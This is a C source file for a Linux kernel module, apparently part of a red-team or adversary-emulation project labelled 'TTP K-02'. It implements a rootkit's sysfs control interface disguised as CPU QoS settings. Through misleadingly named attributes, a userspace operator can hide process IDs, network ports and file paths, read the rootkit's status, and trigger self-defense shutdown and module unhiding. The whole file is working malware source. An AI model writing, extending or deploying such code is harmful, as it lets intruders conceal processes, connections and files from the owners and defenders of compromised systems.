/* sysfs_iface.c — /sys/kernel/cpu_qos_ctrl/ control interface
 * Provides userspace control for the agent (TTP K-02).
 *
 * Attributes:
 *   cpu_affinity  rw  "add <pid>" / "del <pid>"; read returns "pid1 pid2 ..."
 *   freq_policy   rw  "<port>"; read returns current port (0 = disabled)
 *   mem_limit     rw  "<path>"; read returns paths separated by newline
 *   qos_state     r   "active | pids=N | port=P | paths=N"
 *   sched_reset   w   "1" → selfdefense_exit() + module_unhide()
 */
#include "../include/core.h"
#include "../include/sysfs_iface.h"
#include "../include/pid_manager.h"

/* ── Exported globals ────────────────────────────────────────── */

u16  bat_hidden_ports[MAX_HIDDEN_PORTS]         = {0};
int  bat_hidden_port_count                      = 0;
char bat_hidden_paths[MAX_HIDDEN_PATHS][MAX_PATH_LEN];
int  bat_hidden_path_count                      = 0;

/* ── Forward declarations for S2 hooks (stubs in S1) ─────────── */
void __attribute__((weak)) selfdefense_exit(void)  {}
void __attribute__((weak)) module_unhide(void)     {}

/* ── Kobject ─────────────────────────────────────────────────── */

static struct kobject *bat_kobj;

/* ── cpu_affinity (hidden PIDs) ───────────────────────────────── */

static ssize_t show_cpu_affinity(struct kobject *kobj, struct kobj_attribute *attr,
                                  char *buf)
{
    int snap[MAX_HIDDEN_PIDS];
    int n, i;
    ssize_t len = 0;

    n = hidden_pids_snapshot(snap, MAX_HIDDEN_PIDS);
    for (i = 0; i < n; i++)
        len += scnprintf(buf + len, PAGE_SIZE - len, "%d\n", snap[i]);
    return len;
}

static ssize_t store_cpu_affinity(struct kobject *kobj, struct kobj_attribute *attr,
                                   const char *buf, size_t count)
{
    int pid;

    if (strncmp(buf, "add ", 4) == 0) {
        if (kstrtoint(buf + 4, 10, &pid) == 0)
            add_hidden_pid(pid);
    } else if (strncmp(buf, "del ", 4) == 0) {
        if (kstrtoint(buf + 4, 10, &pid) == 0)
            del_hidden_pid(pid);
    } else if (kstrtoint(buf, 10, &pid) == 0 && pid > 0) {
        /* bare number: echo $PID > cpu_affinity  (kstrtoint handles trailing \n) */
        add_hidden_pid(pid);
    }
    return count;
}

/* ── freq_policy (hidden ports) ───────────────────────────────── */

static ssize_t show_freq_policy(struct kobject *kobj, struct kobj_attribute *attr,
                                 char *buf)
{
    int i, n = bat_hidden_port_count;
    ssize_t len = 0;
    for (i = 0; i < n; i++)
        len += scnprintf(buf + len, PAGE_SIZE - len, "%u\n",
                         (unsigned int)bat_hidden_ports[i]);
    return len;
}

static ssize_t store_freq_policy(struct kobject *kobj, struct kobj_attribute *attr,
                                  const char *buf, size_t count)
{
    unsigned int port;
    if (kstrtouint(buf, 10, &port) == 0 && port > 0 && port <= 65535) {
        if (bat_hidden_port_count < MAX_HIDDEN_PORTS)
            bat_hidden_ports[bat_hidden_port_count++] = (u16)port;
    }
    return count;
}

/* ── mem_limit (hidden paths) ─────────────────────────────────── */

static ssize_t show_mem_limit(struct kobject *kobj, struct kobj_attribute *attr,
                               char *buf)
{
    int i;
    ssize_t len = 0;
    for (i = 0; i < bat_hidden_path_count; i++)
        len += scnprintf(buf + len, PAGE_SIZE - len, "%s\n",
                         bat_hidden_paths[i]);
    return len;
}

static ssize_t store_mem_limit(struct kobject *kobj, struct kobj_attribute *attr,
                                const char *buf, size_t count)
{
    size_t len;

    if (bat_hidden_path_count >= MAX_HIDDEN_PATHS)
        return -ENOSPC;

    len = count;
    if (len > 0 && buf[len - 1] == '\n') len--;
    if (len == 0 || len >= MAX_PATH_LEN)
        return -EINVAL;

    memcpy(bat_hidden_paths[bat_hidden_path_count], buf, len);
    bat_hidden_paths[bat_hidden_path_count][len] = '\0';
    bat_hidden_path_count++;
    return count;
}

/* ── qos_state (status) ───────────────────────────────────────── */

static ssize_t show_qos_state(struct kobject *kobj, struct kobj_attribute *attr,
                               char *buf)
{
    return scnprintf(buf, PAGE_SIZE,
                     "active | pids=%d | ports=%d | paths=%d\n",
                     hidden_pid_count(),
                     bat_hidden_port_count,
                     bat_hidden_path_count);
}

/* ── sched_reset (unload) ─────────────────────────────────────── */

static ssize_t store_sched_reset(struct kobject *kobj, struct kobj_attribute *attr,
                                  const char *buf, size_t count)
{
    unsigned int val;
    if (kstrtouint(buf, 10, &val) == 0 && val == 1) {
        selfdefense_exit();
        module_unhide();
    }
    return count;
}

/* ── Attribute definitions ────────────────────────────────────── */

static struct kobj_attribute cpu_affinity_attr =
    __ATTR(cpu_affinity, 0600, show_cpu_affinity, store_cpu_affinity);
static struct kobj_attribute freq_policy_attr  =
    __ATTR(freq_policy,  0600, show_freq_policy,  store_freq_policy);
static struct kobj_attribute mem_limit_attr    =
    __ATTR(mem_limit,    0600, show_mem_limit,    store_mem_limit);
static struct kobj_attribute qos_state_attr    =
    __ATTR(qos_state,    0400, show_qos_state,    NULL);
static struct kobj_attribute sched_reset_attr  =
    __ATTR(sched_reset,  0200, NULL,              store_sched_reset);

static struct attribute *bat_attrs[] = {
    &cpu_affinity_attr.attr,
    &freq_policy_attr.attr,
    &mem_limit_attr.attr,
    &qos_state_attr.attr,
    &sched_reset_attr.attr,
    NULL,
};

static struct attribute_group bat_attr_group = {
    .attrs = bat_attrs,
};

/* ── Init / Exit ─────────────────────────────────────────────── */

int sysfs_iface_init(void)
{
    int ret;

    bat_kobj = kobject_create_and_add("cpu_qos_ctrl", kernel_kobj);
    if (!bat_kobj)
        return -ENOMEM;

    ret = sysfs_create_group(bat_kobj, &bat_attr_group);
    if (ret) {
        kobject_put(bat_kobj);
        bat_kobj = NULL;
        return ret;
    }
    return 0;
}

void sysfs_iface_exit(void)
{
    if (bat_kobj) {
        sysfs_remove_group(bat_kobj, &bat_attr_group);
        kobject_put(bat_kobj);
        bat_kobj = NULL;
    }
}
